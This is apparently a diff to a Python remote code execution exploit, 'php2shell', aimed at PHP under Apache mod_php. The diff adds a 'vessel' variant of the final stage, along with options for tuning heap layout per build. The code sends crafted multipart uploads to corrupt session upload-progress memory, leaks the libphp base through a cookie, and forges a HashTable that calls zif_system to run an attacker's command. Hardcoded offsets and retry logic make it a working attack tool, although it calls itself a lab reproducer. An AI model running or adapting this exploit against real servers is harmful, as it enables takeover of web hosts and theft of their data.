@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-php2shell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork.
+Anatoly PHP2Shell reproducer for exact, verified Apache/mod_php lab builds.
 
-Default profile: official php:8.4.26-apache image (Apache 2.4.69).
-Lab build (Apache 2.4.68, minimal PHP): use --profile lab.
+The Rust CLI supplies the detected version's complete heap geometry and validates
+its running libphp symbols. Stage 3 supports the carrier and early-8.5 vessel
+layouts. The vessel adaptation and verified profiles derive from
+devploit/php2shell (MIT); see PHP2SHELL-LICENSE.
 
 Chain (all attacker traffic is plain HTTP):
   stage 0  HTTP worker rotation
@@ -41,7 +43,7 @@ import time
 import urllib.parse
 from collections import Counter
 
-# Offsets for the lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).
+# Offsets for the lab build (PHP <exact-version>, Apache 2.4.68, Debian 12, gcc 12).
 # They are relative to the libphp.so / Zend MM chunk base, so they do not
 # depend on ASLR.  Rebuilds can shift them; pass --zif-offset/--dtor-offset.
 ZIF_OFFSET = 0x43A870       # zif_system
@@ -49,7 +51,7 @@ DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
 HTDATA_OFFSET = 0x6E0D8     # live 167-byte string used as fake HashTable
 MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL
 
-# bookworm (official php:8.4.26-apache) calibration, measured on the image
+# bookworm (official php:<exact-version>-apache) calibration, measured on the image
 BOOKWORM_STAGE1_N = 841
 BOOKWORM_STAGE2_T = 406
 BOOKWORM_STAGE2_V = 16
@@ -93,6 +95,24 @@ def read_offsets_file(path: str) -> dict[str, int]:
     except (OSError, ValueError):
         pass
     return vals
+
+
+def parse_pads(spec: str) -> list[tuple[int, int]]:
+    """Parse NL:VLxCOUNT groups from an exact verified build profile."""
+    pads: list[tuple[int, int]] = []
+    for group in spec.split(","):
+        match = re.fullmatch(r"(\d+):(\d+)x(\d+)", group)
+        if not match:
+            raise argparse.ArgumentTypeError(
+                f"invalid pad group {group!r}; expected NL:VLxCOUNT"
+            )
+        name_len, value_len, count = (int(value) for value in match.groups())
+        if min(name_len, value_len, count) < 1:
+            raise argparse.ArgumentTypeError("pad lengths and counts must be positive")
+        pads.extend([(name_len, value_len)] * count)
+    if not pads:
+        raise argparse.ArgumentTypeError("at least one stage-3 pad is required")
+    return pads
 
 
 class Target:
@@ -231,7 +251,7 @@ def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
     """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor.
 
     The page-aligned check is 4KB, not 2MB: the lab build happened to map
-    libphp at a 2MB boundary, but the official php:8.4.26-apache image maps it
+    libphp at a 2MB boundary, but the official php:<exact-version>-apache image maps it
     at a 4KB boundary (e.g. base 0x...acdb000).
     """
     if len(raw) < 16:
@@ -258,7 +278,7 @@ class Exploit:
         self.verbose = verbose
         self.profile = profile
         if profile == "bookworm":
-            # official php:8.4.26-apache (Debian 12, Apache 2.4.69)
+            # official php:<exact-version>-apache (Debian 12, Apache 2.4.69)
             self.stage1_n = BOOKWORM_STAGE1_N
             self.stage2_t = BOOKWORM_STAGE2_T
             self.stage2_v = BOOKWORM_STAGE2_V
@@ -475,9 +495,50 @@ class Exploit:
                     read_cap=65536, timeout=30.0)
 
 
+def fire_vessel(ex: Exploit, chunk: int, zif: int, htdata_offset: int,
+                early: int, pads: list[tuple[int, int]], blobs: int,
+                vessel_index: int) -> None:
+    """Stage 3 for verified early-8.5 layouts (devploit/php2shell, MIT).
+
+    The early field shifts the dangling reference onto a fake-HashTable blob;
+    the selected blob embeds the reference pattern instead of using a separate
+    carrier string. All geometry comes from the exact build profile.
+    """
+    htdata = chunk + htdata_offset
+    ex.t.log(f"[*] stage 3 (vessel): HTDATA=0x{htdata:x} ZIF=0x{zif:x} "
+             f"early={early} blobs={blobs} vessel={vessel_index}")
+    parts = [{"name": "PHPSESSID", "data": b"a" * 19}]
+    if early > 0:
+        parts.append({"name": "e0000000", "data": b"E" * early})
+    parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3})
+    for i, (name_len, value_len) in enumerate(pads):
+        name = (f"p{i:0{name_len - 1}d}" if name_len > 0 else "")[:name_len]
+        parts.append({"name": name, "data": b"V" * value_len})
+    parts += [ex._file_part(), ex._big_field()]
+    ex.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
+              read_cap=1 << 20, timeout=max(90.0, ex.t.timeout),
+              extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
+    time.sleep(0.3)
+
+    ht, _ = ex._fake_payload(htdata, zif)
+    vessel = bytearray(ht)
+    vessel[0x88:0x97] = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
+    vessel[0x97] = 0
+    vessel[0x98:0x9C] = struct.pack("<I", 0x0307)
+    parts = [
+        {"name": "PHPSESSID", "data": SID},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwnpwnpwn"},
+    ]
+    for i in range(blobs):
+        data = bytes(vessel) if i == vessel_index else ht
+        parts.append({"name": f"a{i:030d}"[:31], "data": data})
+    ex.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
+              read_cap=65536, timeout=30.0)
+
+
 def main() -> int:
     ap = argparse.ArgumentParser(
-        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
+        description="php2shell one-click exploit (official php:<exact-version>-apache / lab)",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
     ap.add_argument("-u", "--url", required=True,
@@ -511,6 +572,20 @@ def main() -> int:
                     help="do not rotate between failed stage attempts")
     ap.add_argument("--retries", type=int, default=3,
                     help="attempts per leak stage; stage 3 uses retries+2")
+    ap.add_argument("--stage1-n", type=int)
+    ap.add_argument("--forge-len", type=int)
+    ap.add_argument("--stage2-t", type=int)
+    ap.add_argument("--stage2-v", type=int)
+    ap.add_argument("--stage3-mode", choices=("carrier", "lab", "vessel"))
+    ap.add_argument("--stage3-pads", type=parse_pads)
+    ap.add_argument("--stage3-cookie", action=argparse.BooleanOptionalAction, default=None)
+    ap.add_argument("--stage3-wfields", type=int)
+    ap.add_argument("--stage3-fake-len", type=int)
+    ap.add_argument("--stage3-fakes", type=int)
+    ap.add_argument("--stage3-b-name-len", type=int)
+    ap.add_argument("--early", type=int, default=160)
+    ap.add_argument("--blobs", type=int, default=15)
+    ap.add_argument("--vessel-index", type=int, default=1)
     ap.add_argument("-q", "--quiet", action="store_true")
     args = ap.parse_args()
 
@@ -552,6 +627,26 @@ def main() -> int:
     ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                  dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                  huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
+    for argument, attribute in (
+            ("stage1_n", "stage1_n"), ("forge_len", "stage1_forge_len"),
+            ("stage2_t", "stage2_t"), ("stage2_v", "stage2_v"),
+            ("stage3_wfields", "_p2s_wfields"),
+            ("stage3_fake_len", "_p2s_fake_len"),
+            ("stage3_fakes", "_p2s_fakes"),
+            ("stage3_b_name_len", "_p2s_b_name_len")):
+        value = getattr(args, argument)
+        if value is not None:
+            setattr(ex, attribute, value)
+    if args.stage3_pads is not None:
+        ex.stage3_pads = args.stage3_pads
+    elif args.stage3_mode == "vessel":
+        ex.stage3_pads = [(7, 7)] * 3
+    if args.stage3_cookie is not None:
+        ex._p2s_cookie = args.stage3_cookie
+    if args.stage3_mode is not None:
+        ex.stage3_carrier = args.stage3_mode == "carrier"
+    if not 0 <= args.vessel_index < args.blobs:
+        ap.error("--vessel-index must identify one of the --blobs entries")
     t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
     if local_offsets:
         t.log(f"[*] offsets loaded from {args.offsets_file}")
@@ -609,7 +704,11 @@ def main() -> int:
 
     for attempt in range(1, args.retries + 3):
         try:
-            ex.stage3(htdata, zif)
+            if args.stage3_mode == "vessel":
+                fire_vessel(ex, chunk, zif, args.htdata_offset, args.early,
+                            ex.stage3_pads, args.blobs, args.vessel_index)
+            else:
+                ex.stage3(htdata, zif)
         except OSError as e:
             t.log(f"[-] request error: {e}")
         time.sleep(0.8)
